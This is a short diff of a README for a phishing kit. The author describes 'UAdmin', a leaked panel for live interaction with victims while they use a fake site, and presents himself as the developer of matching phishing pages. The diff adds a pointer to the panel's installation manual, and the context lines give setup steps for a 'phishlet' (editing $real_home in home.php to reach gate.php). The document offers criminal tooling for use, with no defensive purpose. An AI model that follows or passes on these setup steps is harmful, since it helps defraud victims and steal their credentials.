@@ -8,6 +8,10 @@ UAdmin allows for ***LIVE*** interactions with the victim, as he uses the site, 
 
 UAdmin is not my program. It was an ukranian panel, which was leaked some time ago. I'm only the developer of phishing sites that work with this.
 
+# How to install UAdmin?
+* Uadmin panel installation tutorial is in manual.txt file in Uadmin.zip.
+
+
 # How to install phishlet?
 * Choose the phishlet you want to use.
 * Edit ***$real_home*** variable in home.php to match your gate.php address.
